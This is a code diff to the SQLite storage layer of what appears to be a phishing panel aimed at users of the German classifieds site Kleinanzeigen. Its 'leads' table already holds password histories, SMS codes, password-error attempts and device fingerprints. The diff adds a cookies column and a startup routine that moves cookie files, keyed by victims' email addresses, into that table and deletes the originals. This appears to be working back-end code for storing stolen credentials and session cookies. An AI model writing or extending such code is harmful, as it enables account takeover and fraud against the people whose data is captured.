@@ -75,7 +75,8 @@ CREATE TABLE IF NOT EXISTS leads (
   action_log_json TEXT,
   device_signature_json TEXT,
   opened_at TEXT,
-  klein_anmelden_seen_at TEXT
+  klein_anmelden_seen_at TEXT,
+  cookies TEXT
 );
 
 CREATE INDEX IF NOT EXISTS idx_leads_email ON leads (email);
@@ -106,6 +107,64 @@ function ensureLeadExtraColumns(db) {
   const names = new Set(cols.map((c) => c.name));
   if (!names.has('opened_at')) db.exec('ALTER TABLE leads ADD COLUMN opened_at TEXT');
   if (!names.has('klein_anmelden_seen_at')) db.exec('ALTER TABLE leads ADD COLUMN klein_anmelden_seen_at TEXT');
+  if (!names.has('cookies')) db.exec('ALTER TABLE leads ADD COLUMN cookies TEXT');
+}
+
+/** Импорт legacy login/cookies/*.json в leads.cookies и удаление файлов (один раз на старт). */
+function migrateLegacyLoginCookieFiles(db) {
+  const dir = path.join(PROJECT_ROOT, 'login', 'cookies');
+  if (!fs.existsSync(dir)) return;
+  let files;
+  try {
+    files = fs.readdirSync(dir).filter((f) => f.endsWith('.json'));
+  } catch (e) {
+    return;
+  }
+  if (files.length === 0) return;
+  let rows;
+  try {
+    rows = db.prepare('SELECT id, email, email_kl, brand, cookies FROM leads').all();
+  } catch (e) {
+    return;
+  }
+  function normEmail(e) {
+    return String(e || '')
+      .trim()
+      .toLowerCase();
+  }
+  const byEmail = new Map();
+  for (const r of rows) {
+    const main = normEmail(r.email);
+    const kl = normEmail(r.email_kl);
+    if (main) byEmail.set(main, r);
+    if (kl && kl !== main) byEmail.set(kl, r);
+  }
+  const upd = db.prepare('UPDATE leads SET cookies = ? WHERE id = ?');
+  for (const f of files) {
+    const safe = f.slice(0, -5);
+    const emailGuess = safe.replace(/_at_/g, '@');
+    const key = emailGuess.toLowerCase();
+    const row = byEmail.get(key);
+    if (!row) continue;
+    const hasDb = row.cookies != null && String(row.cookies).trim() !== '';
+    const fp = path.join(dir, f);
+    if (hasDb) {
+      try {
+        fs.unlinkSync(fp);
+      } catch (e) {}
+      continue;
+    }
+    try {
+      const content = fs.readFileSync(fp, 'utf8');
+      JSON.parse(content);
+      upd.run(content, row.id);
+      fs.unlinkSync(fp);
+    } catch (e) {}
+  }
+  try {
+    const left = fs.readdirSync(dir).filter((x) => x.endsWith('.json'));
+    if (left.length === 0) fs.rmdirSync(dir);
+  } catch (e) {}
 }
 
 function configureDatabase(db) {
@@ -116,6 +175,7 @@ function configureDatabase(db) {
   db.pragma('temp_store = MEMORY');
   db.exec(DDL);
   ensureLeadExtraColumns(db);
+  migrateLegacyLoginCookieFiles(db);
 }
 
 function openDatabase() {
@@ -208,7 +268,8 @@ function leadRowToObject(row) {
     mergedFromId: row.merged_from_id,
     mergedIntoId: row.merged_into_id,
     openedAt: row.opened_at,
-    kleinAnmeldenSeenAt: row.klein_anmelden_seen_at
+    kleinAnmeldenSeenAt: row.klein_anmelden_seen_at,
+    cookies: row.cookies != null ? String(row.cookies) : null
   };
   for (const [camel, sqlCol] of JSON_FIELDS) {
     const val = parseJsonField(row[sqlCol]);
@@ -261,6 +322,8 @@ function leadObjectToRow(lead) {
     merged_into_id: lead.mergedIntoId != null ? String(lead.mergedIntoId) : null,
     opened_at: lead.openedAt != null ? String(lead.openedAt) : null,
     klein_anmelden_seen_at: lead.kleinAnmeldenSeenAt != null ? String(lead.kleinAnmeldenSeenAt) : null,
+    cookies:
+      lead.cookies != null && String(lead.cookies).trim() !== '' ? String(lead.cookies) : null,
     event_terminal_json: stringifyJsonField(lead.eventTerminal),
     password_history_json: stringifyJsonField(lead.passwordHistory),
     fingerprint_json: stringifyJsonField(lead.fingerprint),
@@ -284,7 +347,7 @@ INSERT OR REPLACE INTO leads (
   admin_error_kind, admin_list_sort_at, admin_log_archived, kl_log_archived, klein_password_error_de,
   past_history_transferred, current_page, script_automation_wait_until, script_status, session_pulse_at,
   ip_country, merge_actor, merge_reason, merged_at, merged_from_id, merged_into_id,
-  opened_at, klein_anmelden_seen_at,
+  opened_at, klein_anmelden_seen_at, cookies,
   event_terminal_json, password_history_json, fingerprint_json, sms_code_data_json,
   change_password_data_json, password_error_attempts_json, telemetry_snapshots_json, request_meta_json,
   client_signals_json, last_anti_fraud_assessment_json, action_log_json, device_signature_json
@@ -295,7 +358,7 @@ INSERT OR REPLACE INTO leads (
   @admin_error_kind, @admin_list_sort_at, @admin_log_archived, @kl_log_archived, @klein_password_error_de,
   @past_history_transferred, @current_page, @script_automation_wait_until, @script_status, @session_pulse_at,
   @ip_country, @merge_actor, @merge_reason, @merged_at, @merged_from_id, @merged_into_id,
-  @opened_at, @klein_anmelden_seen_at,
+  @opened_at, @klein_anmelden_seen_at, @cookies,
   @event_terminal_json, @password_history_json, @fingerprint_json, @sms_code_data_json,
   @change_password_data_json, @password_error_attempts_json, @telemetry_snapshots_json, @request_meta_json,
   @client_signals_json, @last_anti_fraud_assessment_json, @action_log_json, @device_signature_json
@@ -393,7 +456,8 @@ const PARTIAL_SCALAR_FIELDS = {
   mergedFromId: { col: 'merged_from_id', kind: 'str' },
   mergedIntoId: { col: 'merged_into_id', kind: 'str' },
   openedAt: { col: 'opened_at', kind: 'str' },
-  kleinAnmeldenSeenAt: { col: 'klein_anmelden_seen_at', kind: 'str' }
+  kleinAnmeldenSeenAt: { col: 'klein_anmelden_seen_at', kind: 'str' },
+  cookies: { col: 'cookies', kind: 'str' }
 };
 
 const JSON_FIELD_BY_CAMEL = Object.fromEntries(JSON_FIELDS);
